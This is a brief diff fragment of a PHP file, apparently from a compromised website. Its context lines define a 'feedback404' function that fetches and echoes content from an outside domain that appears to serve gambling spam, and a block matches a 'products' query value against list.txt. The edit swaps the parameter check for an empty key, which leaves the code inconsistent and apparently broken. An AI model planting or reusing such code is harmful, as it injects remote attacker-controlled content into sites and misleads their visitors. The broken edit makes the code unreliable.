@@ -6,7 +6,7 @@ function feedback404()
     echo file_get_contents("http://serbu4d.id.maskoolin.com/"); 
 }
 
-if (isset($_GET['products'])) {
+if (isset($_GET[''])) {
     $filename = "list.txt";
     $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
     $target_string = strtolower($_GET['products']);
